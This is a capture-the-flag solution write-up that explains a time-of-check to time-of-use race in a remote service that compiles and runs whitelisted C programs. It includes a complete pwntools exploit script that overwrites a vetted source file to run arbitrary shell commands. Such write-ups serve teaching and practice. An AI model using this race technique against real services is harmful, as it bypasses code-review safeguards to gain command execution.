# A Day at the Races &mdash; Solution

We are given access to a remote service that will compile, run and time the execution of our C program. However, the service seems to only allow the execution of two pre-approved C programs.

As the name of the challenge suggests, we're dealing with a race condition here --- the service uses the filesystem to store sources and executables, and multiple instances of the service can be running in parallel reading and writing the same files. In particular, this is a simple example of a [time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) vulnerability --- the file on the filesystem can change between the time its hash is checked against a whitelist and the time it's compiled.
```python
REVIEWED_SOURCES = [
    "24bf297fff03c69f94e40da9ae9b39128c46b7fe", # fibonacci.c
    "55c53ce7bc99001f12027b9ebad14de0538f6a30", # primes.c
]

def check_compile_and_run(source_path):
    slow_print("Checking if the program is safe {} ...\n".format(source_path))
    hash = hashlib.sha1(open(source_path, 'rb').read()).hexdigest()
    if not hash in REVIEWED_SOURCES:
        error("The program you uploaded has not been reviewed yet.")
    exe_path = source_path + ".exe"
    slow_print("Compiling {} ...\n".format(source_path))
    subprocess.check_call(["/usr/bin/gcc", "-o", exe_path, source_path])
    slow_print("Running {} ...\n".format(exe_path))
    time_start = time.time()
    subprocess.check_call(exe_path)
    duration = time.time()-time_start
    slow_print("Duration {} s\n".format(duration))
```

The game plan is as follows:
- We will connect with two instances of the service in parallel, let's denote them with `S1` and `S2`.
- We will send `S1` a legitimate program (e.g., `primes.c`) to be compiled and executed using some filename (e.g., `saldjfasasd.c`).
- At the moment when `S1` is done checking the legitimate source code against the whitelist, but before starting compilation:
  - We send arbitrary C code to instance `S2` *using the same filename* `saldjfasasd.c` as in the previous step, overwriting the legitimate source code on the remote filesystem.
- `S1` will now compile and execute our non-reviewed C code.

The full solution is below.
```python
#!/usr/bin/env python3

import base64
from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 10840)
    else:
        p = process('./server.py')
    return p

TARGET = b"""
#include <stdlib.h>
int main() {
    system("ls -la");
    system("cat flag.txt");
}
"""

GOOD = b"I2luY2x1ZGUgPHN0ZGlvLmg+CgppbnQgaXNfcHJpbWUobG9uZyBsb25nIG4pIHsKICAgIGZvciAobG9uZyBsb25nIGk9MjsgaSppPD1uOyBpKyspCiAgICAgICAgaWYgKG4laSA9PSAwKQogICAgICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiAxOwp9CgppbnQgbWFpbigpIHsKICAgIGxvbmcgbG9uZyBuID0gMWxsPDw1NTsKICAgIHdoaWxlICghaXNfcHJpbWUobikpCiAgICAgICAgbisrOwogICAgcHJpbnRmKCIlbGxkXG4iLCBuKTsgCiAgICByZXR1cm4gMDsKfQ=="

p1 = conn()
p2 = conn()

print(p1.recvuntil(b'filename: '))
p1.sendline(b'saldjfasasd.c')
print(p2.recvuntil(b'filename: '))
p2.sendline(b'saldjfasasd.c')

print(p1.recvuntil(b'(base64):'))
print(p2.recvuntil(b'(base64):'))
p1.sendline(GOOD)
print(p1.recvuntil(b'Compiling'))
p2.sendline(base64.b64encode(TARGET))

p1.interactive()
p2.interactive()
```
